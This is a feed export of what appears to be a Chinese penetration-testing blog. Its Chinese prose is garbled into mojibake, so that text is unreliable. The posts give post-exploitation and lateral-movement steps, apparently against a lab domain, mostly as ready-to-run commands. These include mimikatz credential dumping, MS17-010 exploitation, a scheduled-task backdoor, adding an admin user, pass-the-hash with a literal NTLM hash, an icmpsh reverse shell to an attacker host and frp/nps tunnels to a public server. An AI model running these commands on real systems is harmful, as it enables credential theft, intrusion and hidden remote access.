class="line">kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®</span><br><span class="line">lsa_dump_samï¼šdumpå‡ºlsaçš„SAM</span><br><span class="line">lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡</span><br><span class="line">password_changeï¼šä¿®æ”¹å¯†ç </span><br><span class="line">wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span><br><span class="line">wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç </span><br></pre></td></tr></table></figure><h5 id="è°ƒç”¨mimikatz"><a href="#è°ƒç”¨mimikatz" class="headerlink" title="è°ƒç”¨mimikatz"></a>è°ƒç”¨mimikatz</h5><blockquote><p>åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatzå‘½ä»¤</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">åæ¸—é€]Mimikatzä½¿ç”¨å¤§å…¨ - è‚–æ´‹è‚–æ©ã€ - åšå®¢å›­</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h4 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">portfwd add -l 1234 -p 4444 -r 192.168.41.129</span><br></pre></td></tr></table></figure><h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><h3 id="Venomä»£ç†"><a href="#Venomä»£ç†" class="headerlink" title="Venomä»£ç†"></a>Venomä»£ç†</h3><p><a href="https://blog.csdn.net/u011215939/article/details/103403545">å†…ç½‘ç©¿é€å·¥å…·â€”Venomä½¿ç”¨æ•™ç¨‹</a></p><p><img src="/../images/image-20230331194420393-1686283281461.png" alt="image-20230331194420393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks port</span><br><span class="line">ç„¶åé…åˆproxychainsä½¿ç”¨</span><br></pre></td></tr></table></figure><h3 id="socketsä»£ç†"><a href="#socketsä»£ç†" class="headerlink" title="socketsä»£ç†"></a>socketsä»£ç†</h3><h4 id="MSFé…ç½®"><a href="#MSFé…ç½®" class="headerlink" title="MSFé…ç½®"></a>MSFé…ç½®</h4><ul><li>ä¸ºå½“å‰sesisonæ·»åŠ è·¯ç”±</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170547279-1686283281461.png" alt="image-20230324170547279"></p><ul><li><p>ä½¿ç”¨socks5æ¨¡å—</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170759790-1686283281461.png" alt="image-20230324170759790"></p><p>è¿™é‡Œéœ€è¦æŒ‰ä¸€ä¸‹å›è½¦</p><ul><li><p>æŸ¥çœ‹jobs </p><p><img src="/../images/image-20230324170854437-1686283281462.png" alt="image-20230324170854437"></p></li></ul></li></ul><h4 id="kalié…ç½®"><a href="#kalié…ç½®" class="headerlink" title="kalié…ç½®"></a>kalié…ç½®</h4><blockquote><p>è®©kaliä¸­çš„å…¶ä»–å·¥å…·ä¹Ÿå¯è®¿é—®å†…ç½‘ä¸»æœº</p></blockquote><ul><li><p>å®‰è£…proxychains</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¾‘é…ç½®æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§infoç»™å‡ºçš„ä¿¡æ¯ï¼Œæ·»åŠ socketä»£ç†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VERSION SRVHOST SRVPORT USERNAME PASSWORD</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324171113565-1686283281462.png" alt="image-20230324171113565"></p></li></ul><p><img src="/../images/image-20230324170936060-1686283281462.png" alt="image-20230324170936060"></p><h3 id="ä¸»æœºæ‰«æ"><a href="#ä¸»æœºæ‰«æ" class="headerlink" title="ä¸»æœºæ‰«æ"></a>ä¸»æœºæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure><h3 id="ç«¯å£å’Œæ¼æ´æ‰«æ"><a href="#ç«¯å£å’Œæ¼æ´æ‰«æ" class="headerlink" title="ç«¯å£å’Œæ¼æ´æ‰«æ"></a>ç«¯å£å’Œæ¼æ´æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¸Šä¼ fscanè¿›è¡Œæ‰«æ</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC  192.168.52.141</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šsocks5ä»£ç†-Pn -sTï¼Œä¸æ”¯æŒicmpåè®®</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ ¹æ®fscançš„æ‰«æç»“æœå¯ä»¥çŸ¥é“åŸŸä¸­ä¸‰å°ä¸»æœºå‡å­˜åœ¨ms17_010æ¼æ´</p><p>åˆ©ç”¨</p><p><img src="/../images/image-20230324192937093-1686283281462.png" alt="image-20230324192937093"></p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°åªèƒ½ç”¨<code>admin/smb/ms17_010_command</code></p><p>åœ¨Windows2003ä¸»æœºä¸Š</p><p><img src="/../images/image-20230330141915854-1686283281462.png" alt="image-20230330141915854"></p><p>æ·»åŠ æˆåŠŸ</p><p><img src="/../images/image-20230330142326253-1686283281462.png" alt="image-20230330142326253"></p><p>åŒç†åŸŸæ§server2008ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥payload</p><h4 id="ipc-è¿æ¥"><a href="#ipc-è¿æ¥" class="headerlink" title="ipc$è¿æ¥"></a>ipc$è¿æ¥</h4><blockquote><p><code>IPC$(Internet Process Connection)</code>æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å¯ä»¥åˆ©ç”¨å®ƒäº§ç”Ÿæ•°æ®äº¤äº’ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ï¼Œåœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip /u:username password # å»ºç«‹ipc$è¿æ¥</span><br><span class="line"><span class="built_in">net</span> view \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„å…±äº«èµ„æº</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ # å°†ç›®æ ‡cç›˜æ˜ å°„ä¸ºæœ¬åœ°zç›˜</span><br><span class="line"><span class="built_in">dir</span> \\ip\ç›˜ç¬¦$\dir_path  # åˆ—å‡ºæŒ‡å®šç›®å½•æ–‡ä»¶</span><br><span class="line"><span class="built_in">copy</span> \\ip\ç›˜ç¬¦$\file save_path # ä¸‹è½½æ–‡ä»¶ save_pathä¸ºç»å¯¹è·¯å¾„/ä¿å­˜åˆ°å½“å‰ç›®å½•</span><br><span class="line"><span class="built_in">copy</span> file \\ip\ç›˜ç¬¦$\file # å¤åˆ¶æ–‡ä»¶</span><br><span class="line"><span class="built_in">net</span> use \\ip /<span class="built_in">del</span> /y # åˆ é™¤ipc$è¿æ¥</span><br></pre></td></tr></table></figure><ul><li><p>ç‰ˆæœ¬ï¼œWindows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´</span><br><span class="line"><span class="built_in">at</span> \\ip <span class="built_in">time</span>(<span class="number">11</span>:<span class="number">12</span>) c:\<span class="number">1</span>.bat # åˆ›å»ºå®šæ—¶ä»»åŠ¡</span><br></pre></td></tr></table></figure></li><li><p>ç‰ˆæœ¬ï¼Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´</span><br><span class="line"></span><br><span class="line">schtasks /create /tn &quot;task&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S ip /RU System /u username /p &quot;passwd&quot;</span><br><span class="line"># åˆ›å»ºè¯¥æ—¶é—´ä¹‹åçš„æŸä¸ªæ—¶åˆ»è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ï¼Œä»»åŠ¡å plugin_update</span><br><span class="line"></span><br><span class="line">schtasks /run /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># ç«‹å³è¿è¡Œåé—¨ç¨‹åº</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># åˆ é™¤åˆ›å»ºçš„ä»»åŠ¡</span><br></pre></td></tr></table></figure></li></ul><p>è¿™é‡Œæ·»åŠ äº†ç”¨æˆ·ï¼Œç”¨å¤–ç½‘æœºä½¿ç”¨ipc$ä¸åŸŸæ§å»ºç«‹è¿æ¥åï¼Œå‘ç°æ²¡æœ‰æƒé™</p><p><img src="/../images/image-20230331151440023-1686283281462.png" alt="image-20230331151440023"></p><p>è¿™æ˜¯å› ä¸ºæƒé™é—®é¢˜</p><p><a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">å…³äºIPCå’ŒPTHç”¨æˆ·æƒé™é—®é¢˜ | AresXâ€™s Blog</a></p><blockquote><p>å¯ä»¥å»ºç«‹ipc$è¿æ¥ï¼š</p><ul><li><p>åŸŸç”¨æˆ·ï¼Œå¹¶ä¸”è¯¥åŸŸç”¨æˆ·åœ¨è¿œç¨‹è®¡ç®—æœºçš„ç®¡ç†å‘˜ç»„ä¸­ã€‚</p></li><li><p>æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·</p></li></ul><p>ï¼ˆå¦‚æœæœ¬åœ°ç®¡ç†å‘˜ç»„å¯ç”¨äº†Administratorï¼Œé‚£ä¹ˆæœ¬åœ°ç®¡ç†å‘˜é‡Œåªæœ‰Administratoræ˜¯å¯ä»¥è¿æ¥çš„ï¼‰</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user khaz123 khaz777... /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure><p>å°†khaz123ç”¨æˆ·æ·»åŠ åˆ°åŸŸæ§çš„æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­ï¼ˆå› ä¸ºæ˜¯åŸŸæ§æœåŠ¡å™¨æ·»åŠ ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·è‡ªåŠ¨ä¸ºåŸŸç”¨æˆ·ï¼‰ï¼Œipc$è¿æ¥æˆåŠŸ</p><p><img src="/../images/image-20230330235734609-1686283281462.png" alt="image-20230330235734609"></p><h4 id="è¿œç¨‹æ¡Œé¢è¿æ¥"><a href="#è¿œç¨‹æ¡Œé¢è¿æ¥" class="headerlink" title="è¿œç¨‹æ¡Œé¢è¿æ¥"></a>è¿œç¨‹æ¡Œé¢è¿æ¥</h4><p>åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ç™»å½•</p><p><img src="/../images/image-20230331194248211-1686283281462.png" alt="image-20230331194248211"></p><h5 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><blockquote><p>å®é™…ä¸Špost&#x2F;windows&#x2F;manage&#x2F;enable_rdpå°±æ˜¯åˆ©ç”¨äº†ä¸Šé¢windowsä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼å¼€å¯3389ç«¯å£</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesktop ip </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324160952786-1686283281462.png" alt="image-20230324160952786"></p><h4 id="PTH-å“ˆå¸Œä¼ é€’æ”»å‡»"><a href="#PTH-å“ˆå¸Œä¼ é€’æ”»å‡»" class="headerlink" title="PTH å“ˆå¸Œä¼ é€’æ”»å‡»"></a>PTH å“ˆå¸Œä¼ é€’æ”»å‡»</h4><blockquote><p>æŒ‘æˆ˜å“åº”æœºåˆ¶ï¼Œåªè¦çŸ¥é“NTLMå“ˆå¸Œï¼Œæ— éœ€çŸ¥é“æ˜æ–‡å¯†ç ï¼Œå°±å¯ä»¥é€šè¿‡è®¤è¯</p></blockquote><ul><li>impacket</li></ul><p>å®‰è£…ï¼š<code>sudo apt install python3-impacket</code></p><p><img src="/../images/image-20230331172307275-1686283281462.png" alt="image-20230331172307275"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains  xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f  Administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">wmiexec.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230331172323473-1686283281462.png" alt="image-20230331172323473"></p><p><img src="/../images/image-20230331172427568-1686283281462.png" alt="image-20230331172427568"></p><p><img src="/../images/image-20230331172508321-1686283281462.png" alt="image-20230331172508321"></p><ul><li><p>MSF</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass LM:NTLM</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h4 id="PTTç¥¨æ®ä¼ é€’"><a href="#PTTç¥¨æ®ä¼ é€’" class="headerlink" title="PTTç¥¨æ®ä¼ é€’"></a>PTTç¥¨æ®ä¼ é€’</h4><blockquote><p>åªè¦çŸ¥é“äº†KDCå’ŒServerå¯†é’¥ï¼Œå³å¯ä¼ªé€ é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®</p></blockquote><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><p><a href="https://blog.51cto.com/u_15127677/4045185">https://blog.51cto.com/u_15127677/4045185</a></p><p><a href="https://soapffz.com/archives/558/">https://soapffz.com/archives/558/</a></p><p><a href="https://xz.aliyun.com/t/2536">åæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç«¯å£è½¬å‘ä¸ä»£ç†æ­å»º</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p><img src="/../images/v2-c489e7c96d4a67802a723372c38431f7_1440w.awebp" alt="img"></p><p>SOCKSä»£ç†</p><blockquote><p>SOCKSå…¨ç§°ä¸ºProtocol For Sessions Traversal Across Firewall Securelyï¼Œæ˜¯ä¸€ç§ä»£ç†åè®®ï¼Œå…¶åªæ˜¯ç®€å•åœ°ä¼ é€’æ•°æ®åŒ…ï¼Œè€Œå¹¶ä¸å…³å¿ƒæ˜¯ä½•ç§åº”ç”¨åè®®ï¼Œæ ‡å‡†ç«¯å£ä¸º1080ã€‚</p><p>SOCKSä»£ç†æœ‰SOCKS4å’ŒSOCKS5ä¸¤ä¸ªç‰ˆæœ¬ã€‚SOCKS4åªæ”¯æŒ<strong>TCP</strong>ï¼Œè€ŒSOCKS5åœ¨SOCKS4 çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ‰©å±•ï¼Œå¯ä»¥æ”¯æŒUDPå’Œå„ç§èº«ä»½éªŒè¯æœºåˆ¶ç­‰åè®®ã€‚</p><p>åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œé€šè¿‡æ­å»ºSOCKSä»£ç†ï¼Œå¯ä»¥ä¸ç›®æ ‡å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡ï¼Œé¿å…å¤šæ¬¡ä½¿ç”¨ç«¯å£è½¬å‘ã€‚</p></blockquote><h1 id="æ¢æµ‹ç›®æ ‡å„ç§åè®®æ˜¯å¦å‡ºç½‘åŠå¯¹åº”éš§é“æ­å»º"><a href="#æ¢æµ‹ç›®æ ‡å„ç§åè®®æ˜¯å¦å‡ºç½‘åŠå¯¹åº”éš§é“æ­å»º" class="headerlink" title="æ¢æµ‹ç›®æ ‡å„ç§åè®®æ˜¯å¦å‡ºç½‘åŠå¯¹åº”éš§é“æ­å»º"></a>æ¢æµ‹ç›®æ ‡å„ç§åè®®æ˜¯å¦å‡ºç½‘åŠå¯¹åº”éš§é“æ­å»º</h1><p><strong>ICMP</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1<span class="comment">#Windows</span></span><br><span class="line">ping 114.114.114.114 -c 1<span class="comment">#Linux</span></span><br></pre></td></tr></table></figure><p><strong>éš§é“æ­å»º</strong></p><p><img src="/../images/t012750ea1bdf1f4141.png" alt="img"></p><p>é€šè¿‡dataéƒ¨åˆ†æ¥ä¼ è¾“æ•°æ®</p><ul><li><p>icmpsh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-t host å‘é€pingè¯·æ±‚çš„ä¸»æœºipåœ°å€ï¼Œå³æ”»å‡»æœºçš„IP [è¯¥å‘½ä»¤å¿…é¡»å­˜åœ¨] </span><br><span class="line">-d milliseconds è¯·æ±‚æ—¶é—´é—´éš”ï¼ˆæ¯«ç§’ï¼‰ </span><br><span class="line">-o milliseconds å“åº”è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ </span><br><span class="line">-s bytes æœ€å¤§æ•°æ®ç¼“å†²åŒºå¤§å°ï¼ˆå­—èŠ‚ï¼‰</span><br></pre></td></tr></table></figure><p>æ”»å‡»æœº</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install impacket <span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo python2 icmpsh_m.py æ”»å‡»æœºIP ç›®æ ‡æœºIP</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æœºä¸Š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  <span class="comment">#å…³é—­æœ¬åœ°ICMPåº”ç­”ï¼Œé˜²æ­¢ä¸ç¨³å®š</span></span><br><span class="line">./icmpsh.exe -t æ”»å‡»æœºIP</span><br></pre></td></tr></table></figure></li><li><p><a href="https://teamssix.com/210407-183605.html">ã€å†…ç½‘å­¦ä¹ ç¬”è®°ã€‘6ã€ICMPéš§é“å·¥å…·ä½¿ç”¨ | TeamsSix</a></p></li></ul><p><strong>HTTP</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure><p><strong>DNS</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure><p>éš§é“æ­å»º</p><p><a href="https://github.com/zfl9/dns2tcp">zfl9&#x2F;dns2tcp: å°† dns æŸ¥è¯¢ä» udp è½¬ä¸º tcp çš„å®ç”¨å·¥å…· (github.com)</a></p><p><a href="https://github.com/vaycore/DNStxt-exp">vaycore&#x2F;DNStxt-exp: ä¸€ä¸ªæä¾›æŸ¥è¯¢ TXT è®°å½•çš„ DNS æœåŠ¡åˆ©ç”¨å·¥å…·ã€‚ä¾‹å¦‚ï¼šå¯é…åˆ Windows ä¸‹çš„ certutil å·¥å…·ä¼ è¾“å°æ–‡ä»¶ï¼ˆ64KBï¼‰ (github.com)</a></p><p><strong>TCP</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Telent ip</span><br></pre></td></tr></table></figure><h1 id="ä»£ç†æ­å»º"><a href="#ä»£ç†æ­å»º" class="headerlink" title="ä»£ç†æ­å»º"></a>ä»£ç†æ­å»º</h1><p><img src="/../images/27cbd536f2e946798278123b5fb9572atplv-k3u1fbpfcp-watermark.png" alt="27cbd536f2e946798278123b5fb9572a~tplv-k3u1fbpfcp-watermark"></p><h2 id="åå‘ä»£ç†æ­å»ºâ€“ç›®æ ‡èƒ½è®¿é—®VPS"><a href="#åå‘ä»£ç†æ­å»ºâ€“ç›®æ ‡èƒ½è®¿é—®VPS" class="headerlink" title="åå‘ä»£ç†æ­å»ºâ€“ç›®æ ‡èƒ½è®¿é—®VPS"></a>åå‘ä»£ç†æ­å»ºâ€“ç›®æ ‡èƒ½è®¿é—®VPS</h2><h3 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h3><ul><li><p>æœåŠ¡ç«¯ï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./nps install<span class="comment">#å®‰è£…</span></span><br><span class="line">sudo nps start<span class="comment">#å¯åŠ¨</span></span><br><span class="line">sudo nps stop<span class="comment">#åœæ­¢</span></span><br><span class="line">sudo nps reload<span class="comment">#æœåŠ¡ç«¯é…ç½®æ–‡ä»¶é‡è½½</span></span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶<code>/etc/nps/conf/nps.conf</code>ï¼Œä¸»è¦ä¿®æ”¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># httpä»£ç†</span></span><br><span class="line">http_proxy_ip=0.0.0.0</span><br><span class="line">http_proxy_port=80 </span><br><span class="line">https_proxy_port=443</span><br><span class="line">https_just_proxy=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##æ¡¥æ¥</span></span><br><span class="line">bridge_type=tcp</span><br><span class="line">bridge_port=8024 <span class="comment">##å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯è¿æ¥ç«¯å£</span></span><br><span class="line">bridge_ip=0.0.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># webç«¯è®¾ç½®</span></span><br><span class="line">web_host=xxx  <span class="comment"># å…¬ç½‘ip</span></span><br><span class="line">web_username=admin     <span class="comment"># webç«¯ç™»å½•è´¦å·å¯†ç  å¯ä»¥ä¿®æ”¹</span></span><br><span class="line">web_password=de1ta    </span><br><span class="line">web_port = 8080      <span class="comment"># webç«¯ç«¯å£</span></span><br></pre></td></tr></table></figure><p>é»˜è®¤é…ç½®è¿è¡ŒnpsæœåŠ¡ç«¯å¯åŠ¨ä¼šå ç”¨80ï¼Œ8080ï¼Œ8024ç«¯å£</p></li><li><p>å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰</p><p>ä½¿ç”¨æ— é…ç½®æ–‡ä»¶æ¨¡å¼</p><p><img src="/../images/image-20230918141729869.png" alt="image-20230918141729869"></p><p><img src="/../images/image-20230918141750030.png" alt="image-20230918141750030"></p><p>ä½¿ç”¨è¯¥å‘½ä»¤å¯åŠ¨å®¢æˆ·ç«¯å³å¯è¿æ¥è‡³æœåŠ¡ç«¯</p><p>æˆåŠŸè¿æ¥åï¼Œç‚¹å‡»éš§é“æŒ‰é’®æ¥åˆ›å»ºéš§é“</p><p><img src="/../images/image-20230918142001064.png" alt="image-20230918142001064"></p></li></ul><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p><strong>æœåŠ¡ç«¯ï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰</strong></p><p>é…ç½®<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment"># å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰</strong></p><p>é…ç½®<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">47.120</span>.<span class="number">7.67</span> <span class="comment"># æœåŠ¡ç«¯IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  é€šä¿¡ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># æœåŠ¡ç«¯ä»£ç†ç«¯å£</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># æ˜¯å¦åŠ å¯†</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># æ˜¯å¦å‹ç¼©</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start</span>/b C:\tmp\frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><h3 id="CSçš„socks4ä»£ç†"><a href="#CSçš„socks4ä»£ç†" class="headerlink" title="CSçš„socks4ä»£ç†"></a>CSçš„socks4ä»£ç†</h3><p><strong>é¦–å…ˆéœ€è¦å°†å¿ƒè·³sleepè®¾ç½®ä¸º0</strong></p><p>Beaconå³é”®</p><p><img src="/../images/image-20231014205724384.png" alt="image-20231014205724384"></p><p><img src="/../images/image-20231014205748506.png" alt="image-20231014205748506"></p><p>åˆ›å»ºäº†socks4éš§é“</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socks4:CSæœåŠ¡ç«¯IP:é€‰æ‹©çš„port</span><br></pre></td></tr></table></figure><h2 id="æ­£å‘ä»£ç†æ­å»ºâ€“VPSèƒ½è®¿é—®ç›®æ ‡"><a href="#æ­£å‘ä»£ç†æ­å»ºâ€“VPSèƒ½è®¿é—®ç›®æ ‡" class="headerlink" title="æ­£å‘ä»£ç†æ­å»ºâ€“VPSèƒ½è®¿é—®ç›®æ 